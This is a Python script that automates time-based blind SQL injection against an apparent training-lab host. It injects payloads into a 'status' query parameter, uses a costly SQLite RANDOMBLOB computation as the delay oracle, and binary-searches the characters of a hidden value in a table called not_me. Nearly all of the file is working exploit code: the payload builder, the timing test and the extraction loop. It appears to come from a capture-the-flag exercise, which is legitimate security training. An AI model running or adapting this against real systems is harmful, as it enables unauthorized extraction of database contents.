#!/usr/bin/env python3
"""
Time-based Blind SQL Injection - Automated flag extractor
Target: SQLite backend, injectable 'status' parameter
Table: not_me, Column: value

Uses binary search on ASCII character codes to minimize the number
of delayed (slow) requests needed per character.
"""

import requests
import time
import string

BASE_URL = "http://web0x01.hbtn/api/a3/sql_injection/all_orders"
DELAY_THRESHOLD = 4.0   # seconds - if response takes longer than this, condition was TRUE
SLEEP_BLOB_SIZE = 500000000  # tune this up/down based on your server's actual delay time
TIMEOUT = 15            # safety timeout per request

# Character set to search over - printable ASCII range covers letters, digits, symbols
MIN_CHAR = 32   # space
MAX_CHAR = 126  # ~

def make_payload(condition: str) -> str:
    """
    Wraps a boolean SQL condition so that the response is delayed
    ONLY if the condition evaluates true.
    """
    return (
        f"paid' AND CASE WHEN ({condition}) "
        f"THEN (SELECT LIKE('A',UPPER(HEX(RANDOMBLOB({SLEEP_BLOB_SIZE}))))) "
        f"ELSE 0 END-- -"
    )

def test_condition(condition: str) -> bool:
    """
    Sends the request and measures response time.
    Returns True if the response was delayed (i.e., condition was TRUE).
    """
    payload = make_payload(condition)
    params = {"status": payload}
    start = time.time()
    try:
        requests.get(BASE_URL, params=params, timeout=TIMEOUT)
    except requests.exceptions.Timeout:
        return True  # timed out = definitely delayed = condition true
    elapsed = time.time() - start
    return elapsed >= DELAY_THRESHOLD

def get_length(table: str, column: str, max_len: int = 100) -> int:
    """
    Binary search the length of the value using LENGTH().
    """
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"(SELECT LENGTH({column}) FROM {table})>{mid}"
        if test_condition(cond):
            lo = mid + 1
        else:
            hi = mid
    return lo

def get_char(table: str, column: str, position: int) -> str:
    """
    Binary search a single character's ASCII code at the given 1-indexed position.
    """
    lo, hi = MIN_CHAR, MAX_CHAR
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"(SELECT UNICODE(SUBSTR({column},{position},1)) FROM {table})>{mid}"
        if test_condition(cond):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def main():
    table = "not_me"
    column = "value"

    print("[*] Calibrating: confirming baseline delay works...")
    true_cond = test_condition("1=1")
    false_cond = test_condition("1=2")
    print(f"    1=1 -> delayed: {true_cond}")
    print(f"    1=2 -> delayed: {false_cond}")

    if not true_cond or false_cond:
        print("[!] Calibration failed. Adjust SLEEP_BLOB_SIZE or DELAY_THRESHOLD and retry.")
        return

    print("[*] Calibration successful. Extracting flag length...")
    length = get_length(table, column)
    print(f"[*] Value length: {length}")

    flag = ""
    for pos in range(1, length + 1):
        c = get_char(table, column, pos)
        flag += c
        print(f"[+] Position {pos}: '{c}'  -> current flag: {flag}")

    print("\n[FLAG]", flag)

if __name__ == "__main__":
    main()
